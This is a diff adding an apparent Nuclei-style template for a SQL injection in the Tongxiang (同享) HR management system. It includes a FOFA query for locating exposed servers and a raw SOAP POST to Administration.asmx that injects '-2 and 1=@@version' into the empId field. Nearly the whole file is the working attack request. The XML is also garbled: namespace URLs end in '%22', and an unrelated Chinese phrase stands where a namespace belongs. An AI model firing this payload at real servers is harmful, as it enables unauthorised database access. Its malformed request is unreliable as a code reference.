@@ -1,0 +1,19 @@
+id: poc-sk2wtww7ldnaun0o
+info:
+  name: 同享人力资源管理系统 administration 存在sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sk2wtww7ldnaun0o'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sk2wtww7ldnaun0o
+    fofa: body="/images/tongxehr.ico"
+http:
+- raw:
+  - "POST /MobileService/Administration.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance%22 xmlns:xsd=\"http://www.w3.org/2001/XMLSchema%22 xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/%22>\n<soap:Body>\n\t<GetBed xmlns=\"山峰从云层中探出头来>\n\t<company>-1</company>\n\t<empId>-2 and 1=@@version</empId>\n\t</GetBed>\n</soap:Body>\n</soap:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
